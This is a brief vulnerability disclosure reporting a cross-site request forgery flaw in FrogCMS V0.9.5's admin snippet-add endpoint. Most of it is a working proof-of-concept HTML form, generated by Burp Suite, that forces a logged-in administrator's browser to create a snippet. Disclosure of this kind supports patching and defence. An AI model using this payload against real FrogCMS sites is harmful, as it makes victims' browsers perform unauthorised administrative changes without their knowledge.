
target:https://github.com/philippe/FrogCMS
version: V0.9.5

FrogCMS V0.9.5 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/?/snippet/add

POC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/?/snippet/add" method="POST">
      <input type="hidden" name="/snippet/add" value="" />
<input type="hidden" name="snippet%5Bname%5D" value="cs1" />
<input type="hidden" name="snippet%5Bfilter_id%5D" value="" />
<input type="hidden" name="snippet%5Bcontent%5D" value="" />
<input type="hidden" name="commit" value="Save" />

      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
